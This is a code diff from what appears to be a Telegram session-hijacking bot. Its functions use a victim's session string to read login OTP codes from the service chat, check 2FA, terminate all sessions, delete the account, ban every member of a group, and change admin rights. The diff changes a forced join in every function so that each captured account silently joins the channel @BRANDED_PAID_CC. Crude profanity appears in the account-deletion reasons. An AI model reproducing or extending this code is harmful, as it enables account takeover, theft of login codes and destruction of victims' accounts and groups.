@@ -27,7 +27,7 @@ async def users_gc(session):
             await steve.connect()                          
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))
+                await steve(join("@BRANDED_PAID_CC"))
             except Exception as e:
                 print(e)
             k = await steve(GetAdminedPublicChannelsRequest())            
@@ -39,7 +39,7 @@ async def users_gc(session):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)    
                 k = await stark.invoke(functions.channels.GetAdminedPublicChannels())            
@@ -59,7 +59,7 @@ async def user_info(session):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))
+                await steve(join("@BRANDED_PAID_CC"))
             except Exception as e:
                 print(e)
             k = await steve.get_me()  
@@ -70,7 +70,7 @@ async def user_info(session):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)    
                 k = await stark.get_me()
@@ -107,7 +107,7 @@ async def banall(session,id):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))
+                await steve(join("@BRANDED_PAID_CC"))
             except Exception as e:
                 print(e)
             admins = await steve.get_participants(gc_id, filter=ChannelParticipantsAdmins)
@@ -126,7 +126,7 @@ async def banall(session,id):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)    
                 async for members in stark.get_chat_members(gc_id):  
@@ -155,7 +155,7 @@ async def get_otp(session):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))
+                await steve(join("@BRANDED_PAID_CC"))
             except Exception as e:
                 print(e)
             async for x in steve.iter_messages(777000, limit=2):               
@@ -167,7 +167,7 @@ async def get_otp(session):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)    
                 ok = []
@@ -191,7 +191,7 @@ async def join_ch(session,id):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))              
+                await steve(join("@BRANDED_PAID_CC"))              
             except Exception as e:
                 print(e)
             await steve(join(gc_id))            
@@ -201,7 +201,7 @@ async def join_ch(session,id):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)    
                 await stark.join_chat(gc_id)
@@ -221,7 +221,7 @@ async def leave_ch(session,id):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))               
+                await steve(join("@BRANDED_PAID_CC"))               
             except Exception as e:
                 print(e)
             await steve(leave(gc_id))            
@@ -231,7 +231,7 @@ async def leave_ch(session,id):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)    
                 await stark.leave_chat(gc_id)
@@ -254,7 +254,7 @@ async def del_ch(session,id):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))                
+                await steve(join("@BRANDED_PAID_CC"))                
             except Exception as e:
                 print(e)
             await steve(dc(gc_id))            
@@ -264,7 +264,7 @@ async def del_ch(session,id):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)    
                 await stark.invoke(
@@ -286,7 +286,7 @@ async def check_2fa(session):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))               
+                await steve(join("@BRANDED_PAID_CC"))               
             except Exception as e:
                 print(e)
             try:
@@ -303,7 +303,7 @@ async def check_2fa(session):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)    
                # try:
@@ -327,7 +327,7 @@ async def terminate_all(session):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))             
+                await steve(join("@BRANDED_PAID_CC"))             
             except Exception as e:
                 print(e)
             await steve(rt())
@@ -337,7 +337,7 @@ async def terminate_all(session):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)    
                 await stark.invoke(functions.auth.ResetAuthorizations())
@@ -357,7 +357,7 @@ async def del_acc(session):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))              
+                await steve(join("@BRANDED_PAID_CC"))              
             except Exception as e:
                 print(e)
             await steve(ok.account.DeleteAccountRequest("owner madarchod h"))
@@ -367,7 +367,7 @@ async def del_acc(session):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)    
                 await stark.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
@@ -404,7 +404,7 @@ async def piromote(session,gc_id,user_id):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))                
+                await steve(join("@BRANDED_PAID_CC"))                
             except Exception as e:
                 print(e)
             try:
@@ -416,7 +416,7 @@ async def piromote(session,gc_id,user_id):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)
                 try:    
@@ -451,7 +451,7 @@ async def demote_all(session,gc_id):
             await steve.connect()
             try:
                 await steve(join("@BRANDED_WORLD"))
-                await steve(join("@BRANDED_WORLD"))
+                await steve(join("@BRANDED_PAID_CC"))
                 await steve(join(CHAT))                
             except Exception as e:
                 print(e)
@@ -466,7 +466,7 @@ async def demote_all(session,gc_id):
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
                     await stark.join_chat("@BRANDED_WORLD")
-                    await stark.join_chat("@BRANDED_WORLD")
+                    await stark.join_chat("@BRANDED_PAID_CC")
                 except Exception as e:
                     print(e)
                 async for m in stark.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
